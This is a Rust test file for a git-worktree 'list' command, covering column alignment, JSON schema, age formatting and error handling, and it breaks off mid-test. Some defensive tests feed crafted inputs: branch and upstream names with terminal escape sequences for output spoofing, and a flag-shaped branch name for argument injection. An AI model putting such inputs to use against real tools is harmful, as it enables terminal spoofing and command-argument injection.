//! Tests for `list_command`, its pure helpers, and the `--json` schema.
//!
//! Split out of `list.rs` (as `start.rs`/`clean.rs` already do) because the
//! suite is larger than the module it covers.

use super::*;
use crate::git::RepoInfo;
use crate::io::FakeIo;
use crate::summary::FakeSummaryRunner;
use std::cell::RefCell;
use std::collections::HashMap as StdHashMap;

/// The version string every test's settings store is written with.
const V: &str = "3.1.0+test";

/// The instant every test's clock reads, in epoch milliseconds.
///
/// Fixed rather than `SystemTime::now()` so the AGE column is deterministic:
/// `format_age` truncates, so a real clock would flip a row between `59m` and
/// `1h` depending on when the suite happens to run.
const NOW_MS: i64 = 1_800_000_000_000;
const NOW_SECS: i64 = NOW_MS / 1_000;

/// A scripted git: a worktree porcelain plus per-branch ref info and per-path
/// status payloads, recording every argument vector it is handed.
struct ListGit {
    porcelain: String,
    inside: bool,
    /// `branch -> (unix, iso, upstream)` answers for `for-each-ref`.
    refs: Vec<(String, i64, String, Option<String>)>,
    /// `path -> status --porcelain=v1 -z` payload. A path that is absent
    /// answers empty (clean).
    statuses: Vec<(String, Vec<u8>)>,
    /// Paths whose status call must FAIL, standing in for a broken worktree.
    failing_status: Vec<String>,
    /// Answer for `git log -1` on a detached worktree, as `(unix, iso)`.
    detached_log: Option<(i64, String)>,
    /// Make the batched `for-each-ref` call FAIL outright, standing in for a
    /// git that could not enumerate refs at all (a corrupt refs store, a
    /// permission problem). Distinct from "no branch has a ref", which the same
    /// call reports as an empty answer.
    fail_for_each_ref: bool,
    default_branch: String,
    calls: RefCell<Vec<Vec<String>>>,
}

impl ListGit {
    fn with(entries: &[(&str, &str)]) -> Self {
        let owned: Vec<(&str, Option<&str>)> =
            entries.iter().map(|(p, b)| (*p, Some(*b))).collect();
        ListGit::with_optional_branches(&owned)
    }

    /// Same, but `None` renders the detached-HEAD porcelain shape (a bare
    /// `detached` line and no `branch` line), exactly as real git emits it.
    fn with_optional_branches(entries: &[(&str, Option<&str>)]) -> Self {
        let mut porcelain = String::new();
        for (path, branch) in entries {
            porcelain.push_str(&format!("worktree {path}\nHEAD abc\n"));
            match branch {
                Some(b) => porcelain.push_str(&format!("branch refs/heads/{b}\n\n")),
                None => porcelain.push_str("detached\n\n"),
            }
        }
        ListGit {
            porcelain,
            inside: true,
            refs: Vec::new(),
            statuses: Vec::new(),
            failing_status: Vec::new(),
            detached_log: None,
            fail_for_each_ref: false,
            default_branch: "main".to_string(),
            calls: RefCell::new(Vec::new()),
        }
    }

    fn empty() -> Self {
        let mut git = ListGit::with(&[]);
        git.porcelain = String::new();
        git
    }

    /// Give `branch` a tip committed `age_secs` before [`NOW_SECS`].
    fn with_ref(mut self, branch: &str, age_secs: i64, upstream: Option<&str>) -> Self {
        let unix = NOW_SECS - age_secs;
        self.refs.push((
            branch.to_string(),
            unix,
            format!("iso-{unix}"),
            upstream.map(str::to_string),
        ));
        self
    }

    fn with_status(mut self, path: &str, payload: &[u8]) -> Self {
        self.statuses.push((path.to_string(), payload.to_vec()));
        self
    }

    fn with_failing_status(mut self, path: &str) -> Self {
        self.failing_status.push(path.to_string());
        self
    }

    fn with_detached_log(mut self, age_secs: i64) -> Self {
        let unix = NOW_SECS - age_secs;
        self.detached_log = Some((unix, format!("iso-{unix}")));
        self
    }

    fn with_default_branch(mut self, branch: &str) -> Self {
        self.default_branch = branch.to_string();
        self
    }

    fn calls(&self) -> Vec<Vec<String>> {
        self.calls.borrow().clone()
    }

    /// The argument vector git was handed for `for-each-ref`, if any.
    fn for_each_ref_call(&self) -> Option<Vec<String>> {
        self.calls()
            .into_iter()
            .find(|c| c.first().map(String::as_str) == Some("for-each-ref"))
    }

    /// The `-C <path>` operand of every `status` invocation, in order.
    fn status_paths(&self) -> Vec<String> {
        self.calls()
            .into_iter()
            .filter(|c| c.contains(&"status".to_string()))
            .filter_map(|c| c.get(1).cloned())
            .collect()
    }
}

impl GitRunner for ListGit {
    fn run(&self, args: &[&str]) -> Result<String> {
        self.calls
            .borrow_mut()
            .push(args.iter().map(|a| a.to_string()).collect());

        if args.contains(&"--is-inside-work-tree") {
            return Ok(if self.inside { "true" } else { "false" }.to_string());
        }
        if args.contains(&"worktree") {
            return Ok(self.porcelain.clone());
        }
        if args.first() == Some(&"for-each-ref") {
            if self.fail_for_each_ref {
                return Err(VibeError::GitOperation {
                    command: args.join(" "),
                    message: "failed: cannot read refs".to_string(),
                });
            }
            // Only the branches actually asked for, matching git's behaviour of
            // silently omitting a pattern that matches nothing.
            let wanted: Vec<&str> = args[2..].to_vec();
            let mut out = String::new();
            for (branch, unix, iso, upstream) in &self.refs {
                if !wanted.contains(&format!("refs/heads/{branch}").as_str()) {
                    continue;
                }
                out.push_str(&format!(
                    "{branch}\0{unix}\0{iso}\0{}\n",
                    upstream.as_deref().unwrap_or("")
                ));
            }
            return Ok(out);
        }
        if args.contains(&"symbolic-ref") {
            return Ok(format!("origin/{}", self.default_branch));
        }
        if args.contains(&"log") {
            let Some((unix, iso)) = &self.detached_log else {
                return Err(VibeError::GitOperation {
                    command: args.join(" "),
                    message: "failed: no commits".to_string(),
                });
            };
            return Ok(format!("{unix}\0{iso}"));
        }
        Ok(String::new())
    }

    fn run_raw(&self, args: &[&str]) -> Result<Vec<u8>> {
        self.calls
            .borrow_mut()
            .push(args.iter().map(|a| a.to_string()).collect());

        if args.contains(&"status") {
            let path = args[1];
            if self.failing_status.iter().any(|p| p == path) {
                return Err(VibeError::GitOperation {
                    command: args.join(" "),
                    message: "failed: fatal: not a git repository".to_string(),
                });
            }
            let payload = self
                .statuses
                .iter()
                .find(|(p, _)| p == path)
                .map(|(_, payload)| payload.clone())
                .unwrap_or_default();
            return Ok(payload);
        }
        self.run(args).map(String::into_bytes)
    }
}

/// A [`RepoResolver`] over a fixed path→repo map, hashing files for real.
///
/// Same shape as the one in `config_loader`'s tests: trust decisions have to go
/// through the real hashing so a "trusted" fixture is trusted for the same
/// reason a user's file is.
#[derive(Default)]
struct MapResolver {
    repos: StdHashMap<String, RepoInfo>,
}

impl RepoResolver for MapResolver {
    fn repo_info(&self, path: &str) -> Option<RepoInfo> {
        self.repos.get(path).cloned()
    }
    fn hash_file(&self, path: &str) -> std::result::Result<String, String> {
        crate::hash::hash_file(path).map_err(|e| e.to_string())
    }
}

fn run(io: &FakeIo, git: &ListGit, cwd: &str, json: bool) -> Result<Outcome> {
    run_with(
        io,
        git,
        &MapResolver::default(),
        &no_summary(),
        cwd,
        json,
        OutputOptions::default(),
    )
}

/// A summary runner no test in the un-configured path may reach.
fn no_summary() -> FakeSummaryRunner {
    FakeSummaryRunner::with_stdout("{}")
}

#[allow(clippy::too_many_arguments)]
fn run_with<R: RepoResolver, S: SummaryRunner>(
    io: &FakeIo,
    git: &ListGit,
    resolver: &R,
    summary_runner: &S,
    cwd: &str,
    json: bool,
    opts: OutputOptions,
) -> Result<Outcome> {
    let deps = ListDeps {
        io,
        git,
        resolver,
        summary_runner,
        cwd,
        now_ms: NOW_MS,
        version: V,
    };
    list_command(&deps, json, opts)
}

fn no_home() -> FakeIo {
    FakeIo::new().with_env("HOME", "/nonexistent-home")
}

#[test]
fn errors_when_not_inside_a_repository() {
    let io = no_home();
    let mut git = ListGit::empty();
    git.inside = false;
    let err = run(&io, &git, "/tmp", false).unwrap_err();
    assert_eq!(err.exit_code(), 1);
    assert!(err.to_string().contains("Not inside a git repository."));
}

#[test]
fn lists_every_worktree_with_branch_and_path() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/feat", "feat/login")]);
    let outcome = run(&io, &git, "/repo/main", false).unwrap();
    // The listing is the product; no `cd` is ever emitted.
    assert_eq!(outcome, Outcome::none());

    let text = io.stderr_text();
    assert!(text.contains("main"));
    assert!(text.contains("/repo/main"));
    assert!(text.contains("feat/login"));
    assert!(text.contains("/repo/feat"));
}

#[test]
fn marks_only_the_current_worktree() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/feat", "feat/login")]);
    run(&io, &git, "/repo/feat", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let marked: Vec<&String> = lines.iter().filter(|l| l.starts_with('*')).collect();
    assert_eq!(marked.len(), 1, "exactly one row is marked: {lines:?}");
    assert!(marked[0].contains("feat/login"));
}

#[test]
fn marks_the_current_worktree_from_a_nested_directory() {
    // The user is deep inside the worktree, not at its root.
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/feat", "feat/login")]);
    run(&io, &git, "/repo/feat/src/deep", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let marked: Vec<&String> = lines.iter().filter(|l| l.starts_with('*')).collect();
    assert_eq!(marked.len(), 1);
    assert!(marked[0].contains("feat/login"));
}

#[test]
fn a_sibling_with_a_shared_prefix_is_not_marked() {
    // `/repo/feat-2` must not be read as being inside `/repo/feat`.
    let io = no_home();
    let git = ListGit::with(&[("/repo/feat", "feat"), ("/repo/feat-2", "feat-2")]);
    run(&io, &git, "/repo/feat-2", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let marked: Vec<&String> = lines.iter().filter(|l| l.starts_with('*')).collect();
    assert_eq!(marked.len(), 1);
    assert!(marked[0].contains("feat-2"));
}

#[test]
fn nothing_is_marked_when_cwd_is_outside_every_worktree() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    run(&io, &git, "/somewhere/else", false).unwrap();
    assert!(!io.stderr_text().contains('*'));
}

#[test]
fn scratch_worktrees_are_labelled() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/s", "scratch/20260101")]);
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let scratch_line = lines
        .iter()
        .find(|l| l.contains("scratch/20260101"))
        .expect("scratch row present");
    assert!(scratch_line.contains(SCRATCH_LABEL));
    let main_line = lines
        .iter()
        .find(|l| l.contains(" main "))
        .expect("main row present");
    assert!(!main_line.contains(SCRATCH_LABEL));
}

#[test]
fn columns_are_aligned_so_paths_start_at_one_offset() {
    let io = no_home();
    let git = ListGit::with(&[
        ("/repo/main", "main"),
        ("/repo/long", "feature/a-very-long-branch-name"),
    ]);
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let offsets: Vec<usize> = lines
        .iter()
        .map(|l| l.find("/repo/").expect("every row shows a path"))
        .collect();
    assert!(
        offsets.windows(2).all(|w| w[0] == w[1]),
        "paths not aligned: {lines:?}"
    );
}

#[test]
fn the_current_worktree_is_listed_first() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/feat", "feat/login")]);
    run(&io, &git, "/repo/feat", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    assert!(lines[0].contains("feat/login"), "got: {lines:?}");
}

#[test]
fn remaining_worktrees_follow_mru_order() {
    // main is current (first); of the other two, the most recently jumped-to
    // one must come next even though git lists it last.
    let fx = vibe_test_support::Fixture::new();
    let io = FakeIo::new().with_env("HOME", fx.path().to_str().unwrap());
    crate::mru::record_mru_entry(&io, "feat/a", "/repo/a", 100).unwrap();
    crate::mru::record_mru_entry(&io, "feat/b", "/repo/b", 200).unwrap();

    let git = ListGit::with(&[
        ("/repo/main", "main"),
        ("/repo/a", "feat/a"),
        ("/repo/b", "feat/b"),
    ]);
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    assert!(lines[0].contains("main"), "got: {lines:?}");
    assert!(lines[1].contains("feat/b"), "got: {lines:?}");
    assert!(lines[2].contains("feat/a"), "got: {lines:?}");
}

#[test]
fn json_output_is_parseable_and_carries_every_field() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/s", "scratch/20260101")])
        .with_ref("main", 3_600, None)
        .with_ref("scratch/20260101", 120, Some("origin/develop"))
        .with_status("/repo/s", b"1 M  a.txt\0")
        .with_default_branch("main");
    let outcome = run(&io, &git, "/repo/main", true).unwrap();
    assert_eq!(outcome, Outcome::none());

    // Parsed as generic JSON (not back into `ListEntry`): the assertion is
    // about the wire schema consumers depend on, not about a round-trip
    // through our own derive. Exhaustive equality, not per-key `contains`: an
    // accidental extra key is as much a schema change as a missing one.
    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert_eq!(
        parsed,
        serde_json::json!([
            {
                "branch": "main",
                "path": "/repo/main",
                "current": true,
                "scratch": false,
                "name": "main",
                // The main worktree is ON the default branch, so it is based on
                // nothing.
                "base": null,
                "head": "abc",
                "last_commit_at": format!("iso-{}", NOW_SECS - 3_600),
                "status": "clean",
                "dirty_files": 0,
            },
            {
                "branch": "scratch/20260101",
                "path": "/repo/s",
                "current": false,
                "scratch": true,
                "name": "scratch/20260101",
                // Taken from the upstream, with the remote prefix stripped.
                "base": "develop",
                "head": "abc",
                "last_commit_at": format!("iso-{}", NOW_SECS - 120),
                "status": "dirty",
                "dirty_files": 1,
            },
        ])
    );
}

/// What it guarantees: the four fields shipped in v3.1.0 keep their names,
/// types and values regardless of what the enrichment adds around them. A
/// consumer written against the original schema must keep working.
#[test]
fn json_keeps_the_original_four_fields_intact() {
    let io = no_home();
    let git = ListGit::with_optional_branches(&[
        ("/repo/main", Some("main")),
        ("/repo/s", Some("scratch/20260101")),
        ("/repo/det", None),
    ])
    .with_detached_log(60);
    run(&io, &git, "/repo/main", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    let rows = parsed.as_array().expect("payload is an array");
    let original: Vec<serde_json::Value> = rows
        .iter()
        .map(|row| {
            serde_json::json!({
                "branch": row["branch"],
                "path": row["path"],
                "current": row["current"],
                "scratch": row["scratch"],
            })
        })
        .collect();

    assert_eq!(
        serde_json::Value::Array(original),
        serde_json::json!([
            { "branch": "main", "path": "/repo/main", "current": true, "scratch": false },
            { "branch": "scratch/20260101", "path": "/repo/s", "current": false, "scratch": true },
            { "branch": null, "path": "/repo/det", "current": false, "scratch": false },
        ])
    );

    // Order matters too: `serde` emits declaration order, and a consumer that
    // diffs the raw document would see a reordering as a change.
    let first_keys: Vec<&String> = rows[0]
        .as_object()
        .expect("row is an object")
        .keys()
        .collect();
    assert_eq!(
        first_keys[..4],
        ["branch", "path", "current", "scratch"],
        "the original four fields must stay first, in order"
    );
}

#[test]
fn json_output_omits_the_human_table() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    run(&io, &git, "/repo/main", true).unwrap();
    // A `*` marker would mean the table leaked into the machine-readable form.
    assert!(!io.stderr_text().contains('*'));
}

#[test]
fn empty_repository_listing_says_so() {
    let io = no_home();
    let git = ListGit::empty();
    run(&io, &git, "/repo", false).unwrap();
    assert!(io.stderr_text().contains("No worktrees found."));
}

#[test]
fn empty_json_listing_is_an_empty_array() {
    let io = no_home();
    let git = ListGit::empty();
    run(&io, &git, "/repo", true).unwrap();
    assert_eq!(io.stderr_text(), "[]");
}

#[test]
fn quiet_does_not_silence_the_listing() {
    // The listing IS the command's product; `--quiet` must not make
    // `vibe list` exit 0 having printed nothing.
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    run_with(
        &io,
        &git,
        &MapResolver::default(),
        &no_summary(),
        "/repo/main",
        false,
        OutputOptions::new(false, true),
    )
    .unwrap();
    assert!(io.stderr_text().contains("/repo/main"));
}

#[test]
fn terminal_control_characters_in_a_branch_are_neutralized() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/x", "feat/\x1b[2Kspoof")]);
    run(&io, &git, "/repo/x", false).unwrap();
    let text = io.stderr_text();
    assert!(
        !text.contains('\x1b'),
        "escape reached the terminal: {text}"
    );
    assert!(text.contains('\u{fffd}'));
}

#[test]
fn a_corrupt_mru_store_degrades_to_git_order() {
    let fx = vibe_test_support::Fixture::new();
    let _ = fx.write(".config/vibe/mru.json", "{not an array");
    let io = FakeIo::new().with_env("HOME", fx.path().to_str().unwrap());
    let git = ListGit::with(&[("/repo/a", "feat/a"), ("/repo/b", "feat/b")]);
    run(&io, &git, "/somewhere/else", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    assert!(lines[0].contains("feat/a"), "got: {lines:?}");
    assert!(lines[1].contains("feat/b"), "got: {lines:?}");
}

#[test]
fn is_within_helper() {
    assert!(is_within("/repo/feat", "/repo/feat"));
    assert!(is_within("/repo/feat/src", "/repo/feat"));
    assert!(!is_within("/repo/feat-2", "/repo/feat"));
    assert!(!is_within("/repo", "/repo/feat"));
}

#[test]
fn detached_worktrees_are_listed_not_dropped() {
    // git emits no `branch` line for a detached HEAD; the worktree still
    // exists and must appear in the listing.
    let io = no_home();
    let git = ListGit::with_optional_branches(&[("/repo/main", Some("main")), ("/repo/det", None)]);
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    assert_eq!(lines.len(), 2, "detached row missing: {lines:?}");
    let det = lines
        .iter()
        .find(|l| l.contains("/repo/det"))
        .expect("detached row present");
    assert!(det.contains(DETACHED_LABEL), "got: {det}");
}

#[test]
fn a_detached_worktree_is_marked_current_and_serializes_as_null() {
    let io = no_home();
    let git = ListGit::with_optional_branches(&[("/repo/main", Some("main")), ("/repo/det", None)])
        .with_ref("main", 60, None)
        .with_detached_log(86_400)
        .with_default_branch("main");
    run(&io, &git, "/repo/det", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert_eq!(
        parsed,
        serde_json::json!([
            {
                "branch": null,
                "path": "/repo/det",
                "current": true,
                "scratch": false,
                // A detached worktree still needs a label; the directory
                // basename is the only name it has.
                "name": "det",
                // Nothing truthful can be said about what a detached HEAD is
                // based on.
                "base": null,
                "head": "abc",
                "last_commit_at": format!("iso-{}", NOW_SECS - 86_400),
                "status": "clean",
                "dirty_files": 0,
            },
            {
                "branch": "main",
                "path": "/repo/main",
                "current": false,
                "scratch": false,
                "name": "main",
                "base": null,
                "head": "abc",
                "last_commit_at": format!("iso-{}", NOW_SECS - 60),
                "status": "clean",
                "dirty_files": 0,
            },
        ])
    );
}

#[test]
fn a_nested_worktree_marks_only_the_innermost_row() {
    // `git worktree add <wt>/inner` is accepted by git, so `/repo/feat` and
    // `/repo/feat/inner` can both contain the cwd. Only the innermost is
    // the worktree the user is standing in.
    let io = no_home();
    let git = ListGit::with(&[
        ("/repo/main", "main"),
        ("/repo/feat", "feat"),
        ("/repo/feat/inner", "inner"),
    ]);
    run(&io, &git, "/repo/feat/inner/src", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let marked: Vec<&String> = lines.iter().filter(|l| l.starts_with('*')).collect();
    assert_eq!(marked.len(), 1, "exactly one row is marked: {lines:?}");
    assert!(marked[0].contains("/repo/feat/inner"), "got: {marked:?}");
}

#[test]
fn a_nested_worktree_outside_the_inner_tree_marks_the_outer_row() {
    // The complement: standing in the outer worktree but NOT inside the
    // nested one still marks the outer row (and only it).
    let io = no_home();
    let git = ListGit::with(&[("/repo/feat", "feat"), ("/repo/feat/inner", "inner")]);
    run(&io, &git, "/repo/feat/src", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let marked: Vec<&String> = lines.iter().filter(|l| l.starts_with('*')).collect();
    assert_eq!(marked.len(), 1, "exactly one row is marked: {lines:?}");
    assert!(!marked[0].contains("inner"), "got: {marked:?}");
}

#[test]
fn verbose_does_not_prepend_a_diagnostic_to_the_json_payload() {
    // `--json` writes to the same stderr stream as the diagnostics, so a
    // `[verbose]` line would make the payload unparseable.
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    run_with(
        &io,
        &git,
        &MapResolver::default(),
        &no_summary(),
        "/repo/main",
        true,
        OutputOptions::new(true, false),
    )
    .unwrap();

    let text = io.stderr_text();
    assert!(!text.contains("[verbose]"), "diagnostic leaked: {text}");
    // The whole stream parses as JSON, byte for byte.
    serde_json::from_str::<serde_json::Value>(&text).expect("stderr must be pure JSON");
}

#[test]
fn verbose_still_reports_the_count_in_text_mode() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    run_with(
        &io,
        &git,
        &MapResolver::default(),
        &no_summary(),
        "/repo/main",
        false,
        OutputOptions::new(true, false),
    )
    .unwrap();
    assert!(io.stderr_text().contains("[verbose] Found 1 worktree(s)"));
}

#[test]
fn wide_branch_names_align_by_display_width_not_codepoints() {
    // Each CJK character occupies two terminal cells. Padding by codepoint
    // count would leave the path column ragged.
    let io = no_home();
    let git = ListGit::with(&[("/repo/a", "機能/ログイン"), ("/repo/b", "main")]);
    run(&io, &git, "/repo/a", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let widths: Vec<usize> = lines
        .iter()
        .map(|l| {
            let idx = l.find("/repo/").expect("every row shows a path");
            l[..idx].width()
        })
        .collect();
    assert!(
        widths.windows(2).all(|w| w[0] == w[1]),
        "paths not aligned by display width: {lines:?} -> {widths:?}"
    );
}

// --- format_age ----------------------------------------------------------

#[test]
fn format_age_covers_every_unit_boundary() {
    // What it guarantees: each unit takes over at exactly its own threshold and
    // truncates rather than rounding, so a value never claims more elapsed time
    // than has actually passed.
    let cases: &[(i64, &str)] = &[
        (0, "now"),
        (59, "now"),
        (60, "1m"),
        (119, "1m"),
        (3_599, "59m"),
        (3_600, "1h"),
        (86_399, "23h"),
        (86_400, "1d"),
        (2 * 86_400 - 1, "1d"),
        (7 * 86_400 - 1, "6d"),
        (7 * 86_400, "1w"),
        (30 * 86_400 - 1, "4w"),
        (30 * 86_400, "1mo"),
        (365 * 86_400 - 1, "12mo"),
        (365 * 86_400, "1y"),
        (3 * 365 * 86_400, "3y"),
    ];
    for (elapsed, expected) in cases {
        assert_eq!(
            format_age(NOW_SECS, NOW_SECS - elapsed),
            *expected,
            "elapsed {elapsed}s"
        );
    }
}

#[test]
fn format_age_reads_a_future_commit_as_now() {
    // Clock skew between the machine that made the commit and this one is
    // routine; it must not produce a negative or wrapped age.
    assert_eq!(format_age(NOW_SECS, NOW_SECS + 10_000), "now");
}

// --- enrichment ----------------------------------------------------------

#[test]
fn the_age_column_shows_the_relative_commit_time() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/feat", "feat/x")])
        .with_ref("main", 3 * 86_400, None)
        .with_ref("feat/x", 90 * 60, None);
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    assert!(lines[0].contains(" 3d "), "got: {lines:?}");
    assert!(lines[1].contains(" 1h "), "got: {lines:?}");
}

#[test]
fn the_base_column_prefers_the_upstream_over_the_default_branch() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/feat", "feat/x")])
        .with_ref("feat/x", 60, Some("origin/release/2.0"))
        .with_default_branch("main");
    run(&io, &git, "/repo/feat", false).unwrap();

    let text = io.stderr_text();
    // Only the REMOTE segment is stripped; the rest of the ref name survives.
    assert!(text.contains("release/2.0"), "got: {text}");
}

#[test]
fn the_base_column_falls_back_to_the_default_branch_without_an_upstream() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/feat", "feat/x")])
        .with_ref("feat/x", 60, None)
        .with_default_branch("develop");
    run(&io, &git, "/repo/feat", false).unwrap();
    assert!(io.stderr_text().contains("develop"));
}

#[test]
fn the_main_worktree_has_no_base_of_its_own() {
    // A branch is not based on itself: the default branch's row would otherwise
    // read "develop ← develop".
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "develop")])
        .with_ref("develop", 60, None)
        .with_default_branch("develop");
    run(&io, &git, "/repo/main", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert_eq!(parsed[0]["base"], serde_json::Value::Null);
}

#[test]
fn an_unborn_branch_reports_an_unknown_age() {
    // A branch with no commits has no ref for `for-each-ref` to enumerate, so
    // it is simply absent from the answer. That must read as "unknown", not as
    // an error or an epoch-zero age.
    let io = no_home();
    let git = ListGit::with(&[("/repo/new", "feat/unborn")]);
    run(&io, &git, "/repo/new", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert_eq!(parsed[0]["last_commit_at"], serde_json::Value::Null);

    let io = no_home();
    run(&io, &git, "/repo/new", false).unwrap();
    let line = io.stderr.borrow()[0].clone();
    assert!(
        line.contains(&format!(" {UNKNOWN_CELL} ")),
        "unknown age must render as the placeholder: {line}"
    );
}

#[test]
fn a_worktree_whose_status_cannot_be_read_degrades_to_unknown() {
    // A worktree left broken by a deleted checkout is exactly what a user runs
    // `list` to discover, so the row must survive with an unknown STATUS.
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/broken", "feat/x")])
        .with_ref("main", 60, None)
        .with_ref("feat/x", 60, None)
        .with_failing_status("/repo/broken");
    run(&io, &git, "/repo/main", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    let broken = parsed
        .as_array()
        .unwrap()
        .iter()
        .find(|row| row["path"] == "/repo/broken")
        .expect("the broken worktree is still listed");
    assert_eq!(broken["status"], serde_json::Value::Null);
    assert_eq!(broken["dirty_files"], serde_json::Value::Null);
}

#[test]
fn a_status_failure_warns_in_text_mode_but_never_corrupts_the_json() {
    // The payload shares stderr with the diagnostics, so the warning must be
    // withheld in `--json` mode — a single stray line makes the document
    // unparseable.
    let git = ListGit::with(&[("/repo/broken", "feat/x")])
        .with_ref("feat/x", 60, None)
        .with_failing_status("/repo/broken");

    let json_io = no_home();
    run(&json_io, &git, "/repo/broken", true).unwrap();
    serde_json::from_str::<serde_json::Value>(&json_io.stderr_text())
        .expect("stderr must be pure JSON even when a status call failed");

    let text_io = no_home();
    run(&text_io, &git, "/repo/broken", false).unwrap();
    assert!(
        text_io.stderr_text().contains("Could not read status"),
        "text mode must surface the failure: {}",
        text_io.stderr_text()
    );
}

#[test]
fn the_status_column_shows_the_changed_file_count() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/dirty", "feat/x")])
        .with_ref("main", 60, None)
        .with_ref("feat/x", 60, None)
        .with_status("/repo/dirty", b" M a.txt\0?? b.txt\0 M c.txt\0");
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let dirty = lines
        .iter()
        .find(|l| l.contains("/repo/dirty"))
        .expect("dirty row present");
    assert!(dirty.contains("M 3"), "got: {dirty}");
    let clean = lines
        .iter()
        .find(|l| l.contains("/repo/main"))
        .expect("main row present");
    assert!(clean.contains(STATUS_CLEAN), "got: {clean}");
}

#[test]
fn every_column_stays_aligned_across_rows() {
    // The path is the last column, so a single offset for it proves every
    // preceding column was padded to a common width.
    let io = no_home();
    let git = ListGit::with(&[
        ("/repo/main", "main"),
        ("/repo/long", "feature/a-very-long-branch-name"),
        ("/repo/old", "feat/ancient"),
    ])
    .with_ref("main", 60, None)
    .with_ref("feature/a-very-long-branch-name", 3 * 365 * 86_400, None)
    .with_ref(
        "feat/ancient",
        90 * 86_400,
        Some("origin/some/long/upstream"),
    )
    .with_status("/repo/long", b" M a.txt\0");
    run(&io, &git, "/repo/main", false).unwrap();

    let lines: Vec<String> = io.stderr.borrow().clone();
    let offsets: Vec<usize> = lines
        .iter()
        .map(|l| {
            let idx = l.find("/repo/").expect("every row shows a path");
            l[..idx].width()
        })
        .collect();
    assert!(
        offsets.windows(2).all(|w| w[0] == w[1]),
        "columns not aligned: {lines:?} -> {offsets:?}"
    );
}

#[test]
fn branch_facts_are_read_in_a_single_for_each_ref_call() {
    // The git budget is the reason the columns are affordable: one batched ref
    // lookup for every branch, plus one status per worktree.
    let io = no_home();
    let git = ListGit::with(&[
        ("/repo/main", "main"),
        ("/repo/a", "feat/a"),
        ("/repo/b", "feat/b"),
    ])
    .with_ref("main", 60, None)
    .with_ref("feat/a", 60, None)
    .with_ref("feat/b", 60, None);
    run(&io, &git, "/repo/main", false).unwrap();

    let ref_calls = git
        .calls()
        .into_iter()
        .filter(|c| c.first().map(String::as_str) == Some("for-each-ref"))
        .count();
    assert_eq!(ref_calls, 1, "the ref lookup must be batched");
    assert_eq!(git.status_paths().len(), 3, "one status per worktree");
}

#[test]
fn branch_names_reach_git_as_fully_qualified_refs() {
    // What it guarantees: a branch whose name looks like a flag cannot become
    // one. `refs/heads/--format=x` is unambiguously a pattern operand.
    let io = no_home();
    let git = ListGit::with(&[("/repo/x", "--format=%(objectname)")]);
    run(&io, &git, "/repo/x", false).unwrap();

    let call = git.for_each_ref_call().expect("for-each-ref was invoked");
    assert!(
        call.iter().all(|arg| arg == "for-each-ref"
            || arg.starts_with("--format=%(refname:short)")
            || arg.starts_with("refs/heads/")),
        "an operand escaped the refs/heads/ qualification: {call:?}"
    );
    assert!(call.contains(&"refs/heads/--format=%(objectname)".to_string()));
}

#[test]
fn no_branches_means_no_ref_lookup_at_all() {
    // `git for-each-ref` with no patterns enumerates EVERY ref, which would be
    // both wrong and unbounded, so the call must be skipped entirely.
    let io = no_home();
    let git = ListGit::with_optional_branches(&[("/repo/det", None)]).with_detached_log(60);
    run(&io, &git, "/repo/det", false).unwrap();
    assert_eq!(git.for_each_ref_call(), None);
}

#[test]
fn a_control_character_in_a_base_is_neutralized() {
    // BASE comes from an upstream ref name, which is as attacker-influenced as
    // the branch name next to it.
    let io = no_home();
    let git =
        ListGit::with(&[("/repo/x", "feat/x")]).with_ref("feat/x", 60, Some("origin/spoof\x1b[2K"));
    run(&io, &git, "/repo/x", false).unwrap();

    let text = io.stderr_text();
    assert!(
        !text.contains('\x1b'),
        "escape reached the terminal: {text}"
    );
    assert!(text.contains('\u{fffd}'));
}

#[test]
fn a_missing_head_sha_serializes_as_null_not_an_empty_string() {
